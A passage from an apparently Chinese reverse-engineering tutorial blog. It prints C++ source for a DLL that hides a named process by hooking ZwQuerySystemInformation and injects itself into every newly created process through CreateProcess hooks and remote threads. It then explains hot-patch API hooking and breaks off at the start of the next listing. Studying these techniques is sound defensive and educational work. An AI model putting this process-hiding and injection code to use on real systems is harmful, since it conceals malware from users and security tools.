lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI *PFCREATEPROCESSW)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">BYTE g_pOrgCPA[<span class="number">5</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">BYTE g_pOrgCPW[<span class="number">5</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">BYTE g_pOrgZwQSI[<span class="number">5</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">hook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FARPROC pFunc;</span><br><span class="line">	DWORD dwOldProtect, dwAddress;</span><br><span class="line">	BYTE pBuf[<span class="number">5</span>] = &#123;<span class="number">0xE9</span>, <span class="number">0</span>, &#125;;</span><br><span class="line">	PBYTE pByte;</span><br><span class="line"></span><br><span class="line">	pFunc = (FARPROC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(szDllName), szFuncName);</span><br><span class="line">	pByte = (PBYTE)pFunc;</span><br><span class="line">	<span class="keyword">if</span>( pByte[<span class="number">0</span>] == <span class="number">0xE9</span> )</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(pOrgBytes, pFunc, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	dwAddress = (DWORD)pfnNew - (DWORD)pFunc - <span class="number">5</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;pBuf[<span class="number">1</span>], &amp;dwAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(pFunc, pBuf, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">unhook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FARPROC pFunc;</span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line">	PBYTE pByte;</span><br><span class="line"></span><br><span class="line">	pFunc = (FARPROC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(szDllName), szFuncName);</span><br><span class="line">	pByte = (PBYTE)pFunc;</span><br><span class="line">	<span class="keyword">if</span>( pByte[<span class="number">0</span>] != <span class="number">0xE9</span> )</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(pFunc, pOrgBytes, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">			              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>,             <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,    <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )          <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">AdjustTokenPrivileges</span>(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="built_in">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">GetLastError</span>() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectDll2</span><span class="params">(HANDLE hProcess, LPCTSTR szDllName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	LPVOID pRemoteBuf;</span><br><span class="line">	DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">	FARPROC pThreadProc;</span><br><span class="line"></span><br><span class="line">	pRemoteBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, </span><br><span class="line">                                MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span>( pRemoteBuf == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, (LPVOID)szDllName, </span><br><span class="line">                       dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	pThreadProc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">	hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, </span><br><span class="line">                                 (LPTHREAD_START_ROUTINE)pThreadProc, </span><br><span class="line">                                 pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">NewZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    SYSTEM_INFORMATION_CLASS SystemInformationClass, </span></span></span><br><span class="line"><span class="params"><span class="function">	PVOID SystemInformation, </span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG SystemInformationLength, </span></span></span><br><span class="line"><span class="params"><span class="function">	PULONG ReturnLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	FARPROC pFunc;</span><br><span class="line">	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;</span><br><span class="line">	<span class="type">char</span> szProcName[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">unhook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, g_pOrgZwQSI);</span><br><span class="line"></span><br><span class="line">	pFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), </span><br><span class="line">                           <span class="string">&quot;ZwQuerySystemInformation&quot;</span>);</span><br><span class="line">	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)</span><br><span class="line">             (SystemInformationClass, SystemInformation, </span><br><span class="line">              SystemInformationLength, ReturnLength);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( status != STATUS_SUCCESS )</span><br><span class="line">		<span class="keyword">goto</span> __NTQUERYSYSTEMINFORMATION_END;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( SystemInformationClass == SystemProcessInformation )</span><br><span class="line">	&#123;</span><br><span class="line">		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>(TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">            <span class="keyword">if</span>(pCur-&gt;Reserved2[<span class="number">1</span>] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[<span class="number">1</span>], STR_HIDE_PROCESS_NAME))</span><br><span class="line">			    &#123;</span><br><span class="line">				    <span class="keyword">if</span>(pCur-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">					    pPrev-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">				    <span class="keyword">else</span></span><br><span class="line">					    pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;</span><br><span class="line">			    &#125;</span><br><span class="line">			    <span class="keyword">else</span>		</span><br><span class="line">				    pPrev = pCur;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(pCur-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur-&gt;NextEntryOffset);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">__NTQUERYSYSTEMINFORMATION_END:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">hook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, </span><br><span class="line">                 (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">NewCreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    FARPROC pFunc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unhook</span></span><br><span class="line">    <span class="built_in">unhook_by_code</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessA&quot;</span>, g_pOrgCPA);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用原始 API</span></span><br><span class="line">    pFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;CreateProcessA&quot;</span>);</span><br><span class="line">    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,</span><br><span class="line">                                     lpCommandLine,</span><br><span class="line">                                     lpProcessAttributes,</span><br><span class="line">                                     lpThreadAttributes,</span><br><span class="line">                                     bInheritHandles,</span><br><span class="line">                                     dwCreationFlags,</span><br><span class="line">                                     lpEnvironment,</span><br><span class="line">                                     lpCurrentDirectory,</span><br><span class="line">                                     lpStartupInfo,</span><br><span class="line">                                     lpProcessInformation);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向生成的子进程注入 stealth2.dll</span></span><br><span class="line">    <span class="keyword">if</span>( bRet )</span><br><span class="line">        <span class="built_in">InjectDll2</span>(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hook</span></span><br><span class="line">    <span class="built_in">hook_by_code</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessA&quot;</span>, </span><br><span class="line">                 (PROC)NewCreateProcessA, g_pOrgCPA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">NewCreateProcessW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    FARPROC pFunc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unhook</span></span><br><span class="line">    <span class="built_in">unhook_by_code</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessW&quot;</span>, g_pOrgCPW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得原始 API</span></span><br><span class="line">    pFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;CreateProcessW&quot;</span>);</span><br><span class="line">    bRet = ((PFCREATEPROCESSW)pFunc)(lpApplicationName,</span><br><span class="line">                                     lpCommandLine,</span><br><span class="line">                                     lpProcessAttributes,</span><br><span class="line">                                     lpThreadAttributes,</span><br><span class="line">                                     bInheritHandles,</span><br><span class="line">                                     dwCreationFlags,</span><br><span class="line">                                     lpEnvironment,</span><br><span class="line">                                     lpCurrentDirectory,</span><br><span class="line">                                     lpStartupInfo,</span><br><span class="line">                                     lpProcessInformation);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向生成的子进程注入 stealth2.dll</span></span><br><span class="line">    <span class="keyword">if</span>( bRet )</span><br><span class="line">        <span class="built_in">InjectDll2</span>(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hook</span></span><br><span class="line">    <span class="built_in">hook_by_code</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessW&quot;</span>, </span><br><span class="line">                (PROC)NewCreateProcessW, g_pOrgCPW);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span>            szCurProc[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="type">char</span>            *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 异常处理使注入不会发生在HideProc2.exe进程</span></span><br><span class="line">    <span class="built_in">GetModuleFileNameA</span>(<span class="literal">NULL</span>, szCurProc, MAX_PATH);</span><br><span class="line">    p = <span class="built_in">strrchr</span>(szCurProc, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>( (p != <span class="literal">NULL</span>) &amp;&amp; !_stricmp(p+<span class="number">1</span>, <span class="string">&quot;HideProc2.exe&quot;</span>) )</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="built_in">SetPrivilege</span>(SE_DEBUG_NAME, TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">            <span class="comment">// hook</span></span><br><span class="line">            <span class="built_in">hook_by_code</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessA&quot;</span>, (PROC)NewCreateProcessA, g_pOrgCPA);</span><br><span class="line">            <span class="built_in">hook_by_code</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessW&quot;</span>, (PROC)NewCreateProcessW, g_pOrgCPW);</span><br><span class="line">            <span class="built_in">hook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH :</span><br><span class="line">            <span class="comment">// unhook</span></span><br><span class="line">            <span class="built_in">unhook_by_code</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessA&quot;</span>, g_pOrgCPA);</span><br><span class="line">            <span class="built_in">unhook_by_code</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessW&quot;</span>, g_pOrgCPW);</span><br><span class="line">            <span class="built_in">unhook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, g_pOrgZwQSI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="“热补丁”技术钩取API"><a href="#“热补丁”技术钩取API" class="headerlink" title="“热补丁”技术钩取API"></a>“热补丁”技术钩取API</h3><p>&emsp;上述代码中，<code>NewCreateProcessA</code>函数的结构简单梳理如下：</p>
<p><img src="/images/re-core-principle-3/image-20230415211953046.png" alt="image-20230415211953046" style="zoom:67%;" /></p>
<p>&emsp;每当在程序内部调用<code>CreateProcessA</code> 时，<code>NewCreateProcessA</code>就会被调用执行，不断重复脱钩/挂钩。这种反复进行的脱钩/挂钩操作有两个问题：（1）整体性能低下；（2）在多线程环境下还会产生运行时错误。<strong>（例如，线程尝试运行某段代码时，若另一进程正在对该段代码进行写操作，这时就会出现冲突，最终引发运行时错误。）热补丁（Hot Patch）技术比修改5个字节代码的方法更稳定。</strong></p>
<p>&emsp;热补丁修改7个字节的代码。</p>
<p>&emsp;通过观察多个Windows API的代码，代码有2个明显的特点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. API代码以 &quot;MOV EDI, EDI&quot;(0x8bff) 指令开始。</span><br><span class="line">2. API代码上方有5个NOP指令。（实际观察是代码上方有多个INT3:0xCC）</span><br></pre></td></tr></table></figure>
<p>&emsp;这些代码没啥意义。微软布置这些的原因是为了方便打”热补丁”。<strong>“热补丁”由API钩取组成，在进程处于运行状态时临时更改进程内存中的库文件（重启系统时，修改的目标库文件会被完全取代）</strong>。</p>
<h4 id="热补丁工作原理"><a href="#热补丁工作原理" class="headerlink" title="热补丁工作原理"></a>热补丁工作原理</h4><p><strong>二次跳转</strong></p>
<p>&emsp;将API起始代码之前的5个字节修改为<code>FAR JMP</code>指令（<code>E9XXXXXXXX</code>），跳转到用户钩取函数处（用户写的API的封装）（10001000）。然后将API起始代码的2个字节修改为<code>SHORT JMP</code>（<code>EB F9</code>）指令。该<code>SHORT JMP</code>指令用来跳转到前面的<code>FAR JMP</code>处。像这样经过二次连续跳转，就可以完成对指定API的钩取操作。</p>
<p>&emsp;热补丁钩取与5字节代码修改的比较如下：</p>
<p><img src="/images/re-core-principle-3/image-20230415220758702.png" alt="image-20230415220758702" style="zoom:67%;" /></p>
<p><img src="/images/re-core-principle-3/image-20230415220827780.png" alt="image-20230415220827780" style="zoom:67%;" /></p>
<p>&emsp;在热补丁技术钩取API时，不需要在钩取函数内部进行脱钩/挂钩工作，因为在5字节代码修改中，脱钩是为了调用原API，但是使用热技术时，一直可以调用原API。除去了脱钩操作，因此热补丁技术更加稳定。</p>
<p><strong>源代码分析</strong></p>
<p>&emsp;<strong><code>HideProc3.cpp</code>与之前一样。</strong></p>
<p>&emsp;<strong><code>stealth3.cpp</code>如下所示：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span 